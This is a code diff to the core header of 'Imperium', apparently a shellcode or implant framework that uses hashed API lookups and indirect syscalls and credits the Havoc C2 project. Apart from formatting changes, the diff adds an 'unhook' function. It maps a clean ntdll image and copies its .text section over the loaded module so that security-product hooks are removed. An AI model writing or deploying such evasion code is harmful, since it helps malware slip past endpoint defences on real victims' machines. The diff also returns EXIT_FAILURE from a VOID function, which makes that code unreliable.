@@ -27,6 +27,7 @@
 #define ST_GLOBAL   __attribute__( ( section( ".global" ) ) )
 #define ST_READONLY __attribute__( ( section( ".rdata" ) ) )
 EXTERN_C PVOID StRipStart();
+
 EXTERN_C PVOID StRipEnd();
 #elif defined( IMPERIUM_EXE )
 #define FUNC
@@ -349,7 +350,6 @@ CONSTEVAL SYMBOL_HASH H_FUNC(
 // forward declarations and inline functions
 //
 namespace Imperium {
-
     namespace io {
         /*!
          * took from havoc, credits go to 5pider
@@ -944,7 +944,6 @@ namespace Imperium {
 //
 #ifdef IMPERIUM
 namespace Imperium {
-
     namespace instance {
         /*!
          * @brief
@@ -1104,7 +1103,8 @@ namespace Imperium {
             if ( ! Instance()->ConsoleOutput ) {
                 win32::call< fnAttachConsole >( H_FUNC( "kernel32!AttachConsole" ), ATTACH_PARENT_PROCESS );
 
-                if ( ! ( Instance()->ConsoleOutput = win32::call< fnGetStdHandle >( H_FUNC( "kernel32!GetStdHandle" ), STD_OUTPUT_HANDLE ) ) ) {
+                if ( ! ( Instance()->ConsoleOutput = win32::call<
+                             fnGetStdHandle >( H_FUNC( "kernel32!GetStdHandle" ), STD_OUTPUT_HANDLE ) ) ) {
                     return;
                 }
             }
@@ -1125,7 +1125,8 @@ namespace Imperium {
             //
             // write it to the console
             //
-            win32::call< fnWriteConsoleA >( H_FUNC( "kernel32!WriteConsoleA" ), Instance()->ConsoleOutput, OutputString, OutputSize, NULL, NULL );
+            win32::call< fnWriteConsoleA >( H_FUNC( "kernel32!WriteConsoleA" ), Instance()->ConsoleOutput, OutputString, OutputSize, NULL,
+                                            NULL );
 
             //
             // free the string
@@ -1581,6 +1582,107 @@ namespace Imperium {
             return STATUS_SUCCESS;
         }
     }
+
+    FUNC NTSTATUS unhook(
+        IN PUNICODE_STRING Filepath,
+        IN OUT PVOID       Module
+    ) {
+        HANDLE                Section           = { 0 };
+        NTSTATUS              NtStatus          = { 0 };
+        OBJECT_ATTRIBUTES     ObjAttr           = { 0 };
+        PVOID                 MapModule         = { 0 };
+        SIZE_T                Size              = { 0 };
+        PIMAGE_DOS_HEADER     DosHeader         = { 0 };
+        PIMAGE_NT_HEADERS     NtHeader          = { 0 };
+        PIMAGE_SECTION_HEADER SectionHeader     = { 0 };
+        PVOID                 ModuleTextSection = { 0 };
+        ULONG                 OldProtection     = { 0 };
+
+        if ( ! Filepath || ! Module ) {
+            return STATUS_INVALID_PARAMETER;
+        }
+
+        InitializeObjectAttributes( &ObjAttr, Filepath, OBJ_CASE_INSENSITIVE, nullptr, nullptr );
+
+        //
+        // get a handle onto the file
+        //
+        if ( ! NT_SUCCESS( NtStatus = syscall::indirect<fnNtOpenSection>(
+            H_FUNC("ntdll!NtOpenSection"),
+            &Section, SECTION_MAP_READ, &ObjAttr
+        ) ) ) {
+            return NtStatus;
+        }
+
+        //
+        // map the file
+        //
+        if ( ! NT_SUCCESS( NtStatus = syscall::indirect< fnNtMapViewOfSection >(
+            H_FUNC( "ntdll!NtMapViewOfSection" ),
+            Section, NtCurrentProcess(), &MapModule, NULL, NULL, NULL, &Size, ViewUnmap, NULL, PAGE_READONLY
+        ) ) ) {
+            return NtStatus;
+        }
+
+        //
+        // get some headers from the dll
+        // to make sure its valid
+        //
+        DosHeader = static_cast< PIMAGE_DOS_HEADER >( MapModule );
+        if ( DosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
+            return STATUS_INTERNAL_ERROR;
+        }
+
+        NtHeader = static_cast< PIMAGE_NT_HEADERS >( MapModule + DosHeader->e_lfanew );
+        if ( NtHeader->Signature != IMAGE_NT_SIGNATURE ) {
+            return STATUS_INTERNAL_ERROR;
+        }
+
+        //
+        // search for the .text section
+        //
+        SectionHeader = IMAGE_FIRST_SECTION( NtHeader );
+
+        for ( int i = 0 ; i < NtHeader->FileHeader.NumberOfSections ; i++ ) {
+            //
+            // check if this is the .text section
+            //
+            if ( crypto::hash_string( reinterpret_cast< PCSTR >( SectionHeader[ i ].Name ), 6 ) == H_STR( ".text" ) ) {
+                ModuleTextSection = Module + SectionHeader[ i ].VirtualAddress;
+
+                //
+                // change the module protection
+                //
+                if ( ! NT_SUCCESS( NtStatus = syscall::indirect< fnNtProtectVirtualMemory >(
+                    H_FUNC( "ntdll!NtProtectVirtualMemory" ),
+                    NtCurrentProcess(), &ModuleTextSection, SectionHeader[ i ].Misc.VirtualSize, PAGE_READWRITE, &OldProtection
+                ) ) ) {
+                    return NtStatus;
+                }
+
+                //
+                // copy clean module
+                //
+                mem::copy( ModuleTextSection, MapModule + SectionHeader[ i ].VirtualAddress, SectionHeader[ i ].Misc.VirtualSize );
+
+                //
+                // restore the module protection
+                //
+                if ( ! NT_SUCCESS( NtStatus = syscall::indirect< fnNtProtectVirtualMemory >(
+                    H_FUNC( "ntdll!NtProtectVirtualMemory" ),
+                    NtCurrentProcess(), &ModuleTextSection, SectionHeader[ i ].Misc.VirtualSize,
+                    OldProtection, &OldProtection
+                ) ) ) {
+                    return NtStatus;
+                }
+
+                return STATUS_SUCCESS;
+            }
+        }
+
+
+        return STATUS_INTERNAL_ERROR;
+    }
 }
 
 #ifdef IMPERIUM_SHELLCODE
@@ -1704,7 +1806,7 @@ VOID go(
     // check if there are enough heaps to hold our instance
     //
     if ( Peb->NumberOfHeaps >= Peb->MaximumNumberOfHeaps ) {
-        return;
+        return EXIT_FAILURE;
     }
 
     //
@@ -1716,7 +1818,7 @@ VOID go(
     // allocate memory for the instance
     //
     if ( ! ( *MmAddr = Instance = Imperium::mem::alloc( sizeof( INSTANCE ) ) ) ) {
-        return;
+        return EXIT_FAILURE;
     }
 
     //
